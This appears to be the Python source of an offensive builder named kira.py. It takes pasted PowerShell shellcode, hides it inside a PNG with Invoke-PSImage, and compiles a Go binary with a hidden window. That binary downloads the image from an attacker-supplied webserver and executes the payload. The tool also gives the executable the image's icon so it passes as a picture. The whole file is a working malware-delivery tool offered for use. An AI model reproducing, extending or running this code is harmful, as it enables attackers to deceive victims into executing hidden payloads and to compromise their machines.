from util import banner, success, error, warning, info
import sys, os
import argparse
import subprocess
import shutil
import time
import platform
from PIL import Image

def writeShellcode(sc):
    info("Reading Template...")
    with open('./res/payload.ps1', 'r') as p:
        payload = p.read().replace('\n', '')
    payload = payload.replace('<encoded>', sc)
    with open('./tmp/payload.ps1', 'w') as f:
        f.write(payload)
    success("Wrote Temp Payload!")

def makeEvilImage(img):
    info("Generating Image...")
    command = 'powershell -noprofile -executionpolicy bypass "Import-Module .\\res\\Invoke-PSImage.ps1; Invoke-PSImage -Script {0} -Image {1} -Out .\\dist\\{2}"'
    if not os.path.isdir('./dist'):
        os.makedirs('./dist')
    payload = ".\\tmp\\payload.ps1"
    outimg = img.split('.')
    outimg = outimg[0] + ".png"
    proc = subprocess.Popen(command.format(payload, img,outimg) ,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)
    data = proc.communicate()[0]
    data = data.decode('utf-8').replace('\n', '')
    success("Done - Image is .\\dist\\{0}".format(outimg))
    info("Upload .\\dist\\{0} to a Webserver - NO IMGHOSTS SINCE THEY COMPRESS THE IMG".format(outimg))
    host = input("Direct Link: ")
    info("Reading Go Template")
    with open('./res/bin.go', 'r') as p:
        go_file = p.read()
    go_file = go_file.replace('<urlhere>', host)
    go_file = go_file.replace('<filename>', outimg)
    go_file = go_file.replace('<psimage_output>', data)
    bitmap_path = os.getcwd() + '\\dist\\' + outimg
    go_file = go_file.replace('"{0}"'.format(bitmap_path), '$path')
    info("Building Go Binary")
    with open('./tmp/bin.go', 'w') as f:
        f.write(go_file)
    proc = subprocess.Popen('go build -ldflags="-s -w -H=windowsgui" .\\tmp\\bin.go',
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)
    success("Build Binary")
    time.sleep(5)

    #Change Icon
    icon = Image.open(img)
    icon.save('./tmp/icon.ico', sizes=[(255, 255)])
    subprocess.Popen('.\\res\\rcedit.exe bin.exe --set-icon .\\tmp\\icon.ico',
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)
    time.sleep(2)
    success("Icon Changed")
    shutil.copyfile("bin.exe", ".\\dist\\" + outimg + ".exe")
    os.remove("bin.exe")
    info("Your file is .\\dist\\{0}.exe".format(outimg))
    success("KTHXBYE")

def requirementsCheck(img):
    info("Checking Requirements")
    if not os.path.isdir('./tmp'):
        warning("tmp dir does not exist")
        os.makedirs('./tmp')
        success("Created tmp dir")
    sc = input("Paste your Powershell base64 shellcode:")
    writeShellcode(sc)
    makeEvilImage(img)

def cleanUp():
    info("Cleaning...")
    if os.path.isdir('./tmp'):
        shutil.rmtree('./tmp')

def main():
    banner()
    if not platform.system() == 'Windows':
        error("Only Windows is supported")
        sys.exit(2)
    if len(sys.argv) <= 1:
        error("Usage: kira.py -img <img>")
    else:
        parser = argparse.ArgumentParser(description='Hide a Powershell Payload in an Image')
        parser.add_argument('-img', metavar='image_name', type=str, help='Image to inject payload in')
        args = parser.parse_args()
        requirementsCheck(args.img)

    cleanUp()

if __name__ == "__main__":
    main()
